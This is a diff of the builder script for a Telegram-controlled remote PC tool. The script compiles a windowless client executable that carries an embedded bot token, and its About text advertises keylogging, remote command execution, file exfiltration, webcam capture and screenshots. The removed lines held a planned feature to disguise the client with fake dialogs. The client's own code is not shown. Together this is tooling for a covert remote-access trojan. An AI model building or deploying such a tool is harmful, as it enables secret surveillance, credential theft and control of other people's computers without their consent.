@@ -1,110 +1,168 @@
-# Telegram Remote PC Controller.
+# Telegram Remote PC Controller (TRPCC) main file. Assembling the client side binary file, dependencies installing, etc.
 
 # Imports.
-from utils import *
+from trpcc_utils import print_icon, styled, clrscr, Fore
 
-from os import system, remove
+from trpcc_deps import install_deps
+
+from json import dump
+
+from os import system, remove, mkdir, getcwd
 
 from os.path import exists
 
 from shutil import rmtree, move
 
+from time import sleep
 
-# Print general information.
-print_icon()
 
-print(f'{CENTER}Telegram Remote PC Controller.\n{CENTER[:-1]}I do not accept responsibility for any use of this tool.\n')
+# Icon :)
+clrscr(); print_icon();
 
-print('1. Compile bot to .EXE.\n2. Set Telegram bot token.\n3. Mimic with process. (Not-Implemented).\n4. Help.\n5. Exit.\n')
+# Print menu.
+pmenu = lambda: print(f'{"-" * 10} TRPCC 2.0 Commands List {"-" * 10}\n1. Assembly client side binary file.\n2. Install dependencies.\n3. About TRPCC.\n4. Exit.\n{"-"*45}\n')
 
-# Main.
-while True:
+pmenu()
+
+# Utility functions.
+def no_blank_input(placeholder: str) -> str:
+    while 1:
+        _input = input(placeholder)
+
+        if _input:
+            return _input
+
+def rma_ifne(file: str, tree: bool=False) -> None:
+    if exists(file): remove(file) if not tree else rmtree(file)
+
+def clear_pcache() -> None:
+    try: rma_ifne('__pycache__', 1)
+    except: ...
+
+# Main loop.
+while 1:
     try:
-        command = input('>>> ')
+        # Option input.
+        command = input('---> ')
 
+        # Assembly binary.
         if command == '1':
-            app_name = input('\nApplication name >>> ')
+            clrscr(); print_icon(); print('\n')
 
-            debug_mode = input('\nDebug (y/N) >>> ')
+            name = no_blank_input('Application name -> ').strip()
 
-            icon = input('\nIcon (none if no icon) >>> ')
+            icon = input('[OPTIONAL] Icon -> ').strip() or None
 
-            with open('NAME', 'w') as name:
-                name.write(app_name)
+            token = no_blank_input('Bot token -> ').strip()
 
-            debug = debug_mode.lower() == 'y'
+            password = input('[OPTIONAL] Bot password -> ').strip() or None
 
-            icon = None if icon == 'none' else icon
+            clrscr(); print_icon(); print('\n')
 
-            print('\nStarting...\n')
+            with open('MEIPASS_DATA.json', 'w') as meipass:
+                dump({'TOKEN': token, 'NAME': name, 'PASSWORD': password}, meipass)
 
-            if exists(f'{app_name}.exe'):
-                remove(f'{app_name}.exe')
+            print('INFO: RTD written successfully.')
 
-            system(f'pyinstaller tg_client.py -F -n="{app_name}" {"--noconsole" if not debug else ""} {f"--icon={icon}" if icon else ""} --add-binary="TOKEN:." --add-binary="NAME:."')
+            if not exists('csbin'):
+                mkdir('csbin')
 
-            remove(f'{app_name}.spec')
+                print('INFO: CSBIN directory created.')
 
-            rmtree('build')
+            else:
+                print('INFO: No need for creating CSBIN directory.')
 
-            move(f'dist\\{app_name}.exe', '.')
+            print('INFO: Passing a command to assemble client side binary file...')
 
-            rmtree('dist')
+            system(f'pyinstaller trpcc_client.py -F -n="{name}" {f"--icon={icon}" if icon else ""} --noconsole --add-binary="MEIPASS_DATA.json;." --version-file=META.dat')
 
-            print(styled(f'\nSuccess. Your EXE -> {app_name}.exe\n', Fore.GREEN, bold=True))
+            print('\nINFO: Finished assembling. Check for status.')
 
+            remove('MEIPASS_DATA.json')
+
+            print('INFO: RTD erased successfully.')
+
+            try:
+                rma_ifne(f'{name}.spec')
+
+                rma_ifne('__pycache__', 1)
+
+                rma_ifne('build', 1)
+            except PermissionError:
+                print('WARNING: Failed to clean cache (1).')
+
+            print('INFO: Cache cleaned (1).')
+
+            if exists('dist'):
+                move(f'dist/{name}.exe', f'./csbin/{name}.exe')
+
+                print('INFO: Binary file assembled.')
+
+                try:
+                    rmtree('dist')
+                except PermissionError:
+                    print('WARNING: Failed to clean cache (2).')
+
+            print('INFO: Cache cleaned (2).')
+
+            _winsep = '\\'
+
+            print(styled(f'\nFinished assembling client side binary file. Search for: "{getcwd().replace(_winsep, "/")}/csbin/{name}.exe".', Fore.GREEN, bold=True))
+
+            input('\nPress enter to finish... ')
+
+            clrscr(); print_icon(); pmenu()
+
+        # Install dependencies.
         elif command == '2':
-            token = input('\nToken >>> ')
+            install_deps()
 
-            with open('TOKEN', 'w') as _token:
-                _token.write(token)
+            sleep(1.5)
 
-            print(styled('\nToken updated.\n', Fore.GREEN, bold=True))
+            clrscr(); print_icon(); pmenu()
 
+        # About TRPCC.
         elif command == '3':
-            print(styled('\nNot-Implemented.\n', Fore.LIGHTRED_EX, bold=True))
+            print('''\nTRPCC (Telegram Remote PC Controller) is a software for controlling PC remotely via Telegram bot. It includes robust features like file and directory management (insertion, fetching, deletion, renaming, and movement), execution of system commands, process management, and advanced key logging system. Users can also interact with hardware components such as the mouse, keyboard, webcam, and monitors, as well as capture screenshots and play or manage sounds, ETC!
 
-            # print('\nSelect process:\n1. Confirm dialog.\n2. Loading dialog.\n3. Custom process (.py) (IN-DEVELOPMENT).\n4. Reset.\n')
+The bot supports password protection for secure access. It is designed for seamless operation across platforms, providing flexibility for various tasks, whether automation, remote monitoring, or system management. With its comprehensive toolset, this bot offers an efficient way to handle a wide range of system operations remotely via Telegram.
 
-            # process = input('Process >>> ')
+https://github.com/xzripper/trpcc 2.0 by https://github.com/xzripper.\n''')
 
-            # if process == '1':
-            #     title = input('\nTitle >>> ')
-            #     text = input('\nText >>> ')
+            input('Press enter to finish reading... ')
 
-            #     set_mimic(CONFIRM_DIALOG, (title, text))
+            clrscr(); print_icon(); pmenu()
 
-            #     print(styled('\nSet MIMIC to CONFIRM_DIALOG.\n', Fore.GREEN, bold=True))
-
-            # elif process == '2':
-            #     title = input('\nTitle >>> ')
-            #     text = input('\nText >>> ')
-
-            #     set_mimic(LOADING_DIALOG, (title, text))
-
-            #     print(styled('\nSet MIMIC to LOADING_DIALOG.\n', Fore.GREEN, bold=True))
-
-            # elif process == '3':
-            #     print(styled('\nNot-Implemented.\n', Fore.LIGHTRED_EX, bold=True))
-
-            # elif process == '4':
-            #     set_mimic(NONE_DIALOG, (title, text))
-
-            #     print(styled('\nSet MIMIC to NONE_DIALOG.\n', Fore.GREEN, bold=True))
-
-            # else:
-            #     print(styled('\nInvalid option.\n', Fore.RED, bold=True))
-
+        # Exit.
         elif command == '4':
-            with open('generic/help', 'r') as _help:
-                print(_help.read())
+            print('\nBye!')
 
-        elif command == '5':
-            break
+            sleep(.5)
 
+            clrscr()
+
+            clear_pcache()
+
+            exit(0)
+
+        # Invalid option.
         else:
-            print(styled('\nInvalid command.\n', Fore.RED, bold=True))
-    except KeyboardInterrupt:
-        print(styled('\n\nCTRL + C [KeyboardInterrupt].', Fore.LIGHTGREEN_EX, bold=True))
+            print(styled('\nNonexistent option!\n', Fore.RED, bold=True))
 
-        break
+            sleep(1); clrscr(); print_icon(); pmenu()
+    except KeyboardInterrupt:
+        if input('\n\nAre you sure? (Y/n): ').lower() == 'y':
+            print('\nBye!')
+
+            sleep(.5)
+
+            clrscr()
+
+            clear_pcache()
+
+            exit(0)
+
+        print()
+
+    except Exception as exception:
+        print(styled(f'\nGot unexpected exception: `{str(exception)}` (representation of it).\n', Fore.RED, bold=True))
